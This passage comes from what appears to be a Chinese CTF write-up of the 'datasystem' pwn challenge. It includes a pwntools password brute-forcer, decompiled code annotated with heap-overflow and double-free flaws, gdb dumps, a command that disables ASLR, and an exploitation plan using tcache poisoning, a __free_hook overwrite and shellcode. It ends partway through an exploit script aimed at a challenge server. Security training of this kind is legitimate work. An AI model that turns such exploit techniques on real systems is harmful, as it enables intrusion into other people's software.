src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109271850288.png" alt="image-20210927095033028"></p><ul><li>这里进行爆破，写脚本：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">    sh = process(<span class="string">&#x27;./datasystem&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;please input username: &quot;</span>, <span class="string">&quot;admin\x00&quot;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;please input password: &quot;</span>, <span class="built_in">chr</span>(char) * <span class="number">32</span>)</span><br><span class="line">    msg = sh.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Login Fail&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;valid char:&quot;</span>, <span class="built_in">chr</span>(char))</span><br><span class="line">    sh.close()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;valid char:&#x27;, &#x27;c&#x27;)</span><br><span class="line">(&#x27;valid char:&#x27;, &#x27;\xec&#x27;)</span><br></pre></td></tr></table></figure><ul><li>接下来就是简单的堆溢出：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">sub_558B0F1BBD40</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v0; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+0h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+4h] [rbp-34h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;2.delete&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;3.show&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;4.edit&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt; :&quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">        <span class="keyword">if</span> ( v2 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        sub_558B0F1BB970();<span class="comment">// 新增堆</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v2 == <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v2 == <span class="number">3</span> )<span class="comment">// 打印堆</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);<span class="comment">// 输入堆序号</span></span><br><span class="line">        v0 = (<span class="keyword">const</span> <span class="keyword">char</span> *)qword_558B0F1BE5A0[v3];<span class="comment">// 如果指针存在</span></span><br><span class="line">        <span class="keyword">if</span> ( v0 )</span><br><span class="line">          __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: %s&quot;</span>, v0);<span class="comment">// 打印堆内容</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 != <span class="number">4</span> )<span class="comment">// 修改堆</span></span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);<span class="comment">// 输入堆序号</span></span><br><span class="line">        <span class="keyword">if</span> ( qword_558B0F1BE5A0[v3] )<span class="comment">// 如果指针存在</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">          read(<span class="number">0</span>, (<span class="keyword">void</span> *)qword_558B0F1BE5A0[v3], dword_558B0F1BE600[v3]);<span class="comment">// 读入长度dword_558B0F1BE600[v3]</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Index:&quot;</span>);<span class="comment">// 删除堆</span></span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">0xB</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_558B0F1BE5A0[v3]);<span class="comment">// 这里没有检测堆是否存在，可能存在double free漏洞</span></span><br><span class="line">    v1 = v3;</span><br><span class="line">    qword_558B0F1BE5A0[v3] = <span class="number">0LL</span>;<span class="comment">// 对指针和数组长度清零</span></span><br><span class="line">    dword_558B0F1BE600[v1] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>新增堆（这个检测堆是否存在的逻辑还真的是清奇）：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_558B0F1BB970</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  _DWORD maxlen[<span class="number">9</span>]; <span class="comment">// [rsp+4h] [rbp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;maxlen[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( qword_558B0F1BE5A0[<span class="number">0</span>] )<span class="comment">// 检测有哪个堆空出来了</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( qword_558B0F1BE5A8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( qword_558B0F1BE5B0 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( qword_558B0F1BE5B8 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( qword_558B0F1BE5C0 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( qword_558B0F1BE5C8 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( qword_558B0F1BE5D0 )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( qword_558B0F1BE5D8 )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( qword_558B0F1BE5E0 )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v0 = <span class="number">0LL</span>;</span><br><span class="line">                    <span class="keyword">if</span> ( !qword_558B0F1BE5E8 )</span><br><span class="line">                      v0 = <span class="number">9LL</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    v0 = <span class="number">8LL</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  v0 = <span class="number">7LL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                v0 = <span class="number">6LL</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v0 = <span class="number">5LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v0 = <span class="number">4LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v0 = <span class="number">3LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v0 = <span class="number">2LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v0 = <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size: &quot;</span>);<span class="comment">// 输入新增大小</span></span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, maxlen);</span><br><span class="line">  v1 = maxlen[<span class="number">0</span>];</span><br><span class="line">  v2 = maxlen[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( maxlen[<span class="number">0</span>] &gt; <span class="number">0x500</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    maxlen[<span class="number">0</span>] = <span class="number">1280</span>;<span class="comment">// 如果大于0x500，赋值v2，v1变量为0x500</span></span><br><span class="line">    v2 = <span class="number">1280</span>;</span><br><span class="line">    v1 = <span class="number">1280LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  qword_558B0F1BE5A0[v0] = (__int64)<span class="built_in">malloc</span>(v1);<span class="comment">// 新增堆时没有对内容清零i</span></span><br><span class="line">  dword_558B0F1BE600[v0] = v2;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;fuiling with my data&quot;</span>);</span><br><span class="line">  v3 = <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)qword_558B0F1BE5A0[v0], maxlen[<span class="number">0</span>], <span class="string">&quot;%s&quot;</span>, byte_558B0F1BE0A0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;what&#x27;s your Content: &quot;</span>);</span><br><span class="line">  v4 = read(<span class="number">0</span>, (<span class="keyword">void</span> *)qword_558B0F1BE5A0[v0], v3);<span class="comment">// 但是这里读入的时候使用的是v3</span></span><br><span class="line">  <span class="keyword">if</span> ( maxlen[<span class="number">0</span>] &lt; v4 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error,try again&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ *(_QWORD *)&amp;maxlen[<span class="number">1</span>];</span><br></pre></td></tr></table></figure><ul><li><p>这里回顾一下<code>snprintf</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int snprintf(char* dest_str,size_t size,const char* format,...);</span><br></pre></td></tr></table></figure><ul><li>如果格式化后的字符串长度小于等于<code>size</code>，则会把字符串全部复制到<code>str</code>中，并给其后添加一个字符串结束符<code>\0</code>。</li><li>如果格式化后的字符串长度大于<code>size</code>，超过<code>size</code>的部分会被截断，只将其中的 <code>size-1</code>个字符复制到<code>str</code>中，并给其后添加一个字符串结束符<code>\0</code>，返回值为欲写入的字符串长度。</li></ul></li><li><p>所以这里v3为作者想要写入的数据长度，就看<code>byte_558B0F1BE0A0</code>的<code>\0</code>在哪个位置：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;fuiling with my data&quot;</span>);</span><br><span class="line">v3 = <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)qword_558B0F1BE5A0[v0], maxlen[<span class="number">0</span>], <span class="string">&quot;%s&quot;</span>, byte_558B0F1BE0A0);</span><br></pre></td></tr></table></figure><ul><li>这里使用gdb调试：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./datasystem&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">   sh.sendafter(<span class="string">&#x27;please input username: &#x27;</span>, <span class="string">&#x27;admin\x00&#x27;</span>)</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;please input password: &#x27;</span>, <span class="string">&#x27;c&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt; :&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">login()</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><ul><li>读入时，变成了<code>0x506</code>字节长度，那么存在堆溢出（虽然最后会判断并回显失败，但实际上已经写入）：<ul><li>注意gdb调试的是由于开启了aslr，所以使用<code>b *addr</code>或者<code>b *$rebase(addr)</code>会定位不到地址，因为text地址还有一段随机偏移，所以需要使用命令<code>sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code>。</li></ul></li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109271850289.png" alt="image-20210927114532230" style="zoom:50%;" /></p><ul><li><p>现在分析<code>0x506</code>是如何形成的：</p><ul><li>发现<code>byte_558B0F1BE0A0</code>数组被初始化为<code>0x500</code>个<code>a</code>字符。</li><li>且在数组后面存有一个6位的地址，其实这里存放着第一个堆空间的指针：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109271850290.png" alt="image-20210927111233397" style="zoom:50%;" /></p><ul><li>由于堆地址为6位，高位为<code>\x00</code>所以会直接截断。</li></ul></li><li><p>这里复习一下<code>main_arena</code>的结构：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">__libc_lock_define (, mutex); <span class="comment">// 锁</span></span><br><span class="line"><span class="keyword">int</span> flags;</span><br><span class="line"><span class="keyword">int</span> have_fastchunks; <span class="comment">// 如果fastbin不为空，这个字段就被置位</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Fastbins */</span></span><br><span class="line">mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">mchunkptr top; <span class="comment">// 指向top chunk</span></span><br><span class="line"></span><br><span class="line">mchunkptr last_remainder; <span class="comment">// 指向切割后剩下的last reminder</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE]; <span class="comment">// bin的位图</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">INTERNAL_SIZE_T attached_threads; <span class="comment">// 引用当前arena的线程数量</span></span><br><span class="line"></span><br><span class="line">INTERNAL_SIZE_T system_mem; <span class="comment">// 记录当前一个获取的系统内存</span></span><br><span class="line">INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x7ffff7dd1b10</span><br><span class="line">0x7ffff7dd1b10 &lt;__malloc_hook&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:0x00000001000000000x0000000000000000mutex flag, fastbin 0x20</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;:0x00000000000000000x00000000000000000x30, 0x40</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;:0x00000000000000000x00000000000000000x50, 0x60</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;:0x00000000000000000x00000000000000000x70, 0x80</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;:0x00000000000000000x000055555555a0c0, topchunk</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;:0x000055555555a0200x000055555555a020last_remiander, unsorted bin</span><br><span class="line">0x7ffff7dd1b90 &lt;main_arena+112&gt;:0x000055555555a0200x00007ffff7dd1b88, small bin</span><br><span class="line">0x7ffff7dd1ba0 &lt;main_arena+128&gt;:0x00007ffff7dd1b880x00007ffff7dd1b98</span><br></pre></td></tr></table></figure><ul><li>知道存在堆溢出后，思路具体如下：<ul><li>首先构造一个unsorted bin。</li><li>使用unsorted bin残存的bk，泄露出libc地址。</li><li>利用tcache posion attack将堆分配到<code>__free_hook - 0x200</code>的位置。</li><li>将<code>__free_hook</code>修改为<code>setcontext + 53</code>，修改寄存器环境，执行read函数。</li><li>利用程序mmap的<code>0x23330000</code>这一段rwx内存执行shellcode。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&quot;debug&quot;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&#x27;./datasystem&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27560</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./datasystem&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">   sh.sendafter(<span class="string">&#x27;please input username: &#x27;</span>, <span class="string">&#x27;admin\x00&#x27;</span>)</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;please input password: &#x27;</span>, <span class="string">&#x27;c&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt; :&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt; :&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt; :&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt; :&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">login()</span><br><span class="line">add(<span class="number">0x440</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x8</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line">show(<span 